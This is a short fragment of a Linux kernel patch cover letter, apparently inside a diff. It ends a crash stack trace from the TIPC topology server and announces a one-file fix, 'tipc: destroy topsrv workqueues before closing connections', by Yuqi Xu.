+[   20.903699]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   20.904372]  ? __pfx_tipc_topsrv_accept+0x10/0x10
+[   20.905029]  process_one_work+0x197/0x390
+[   20.905595]  worker_thread+0x169/0x2d0
+[   20.906129]  ? __pfx_worker_thread+0x10/0x10
+[   20.906729]  kthread+0xe1/0x120
+[   20.907178]  ? __pfx_kthread+0x10/0x10
+[   20.907706]  ret_from_fork+0x177/0x240
+[   20.908233]  ? __pfx_kthread+0x10/0x10
+[   20.908765]  ret_from_fork_asm+0x1a/0x30
+[   20.909326]  </TASK>
+[   20.909756] Kernel Offset: 0x32a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   20.911233] Rebooting in 1 seconds..
+
+-----END crash log-----
+
+Best regards,
+Yuqi Xu
+
+Yuqi Xu (1):
+  tipc: destroy topsrv workqueues before closing connections
+
+ net/tipc/topsrv.c | 80 ++++++++++++++++++++++++++++++++++++++---------
+ 1 file changed, 65 insertions(+), 15 deletions(-)
+
+
+base-commit: 9c572a83037a7dcd653ba3a9cc468c16b857d0c9
+-- 
+2.55.0
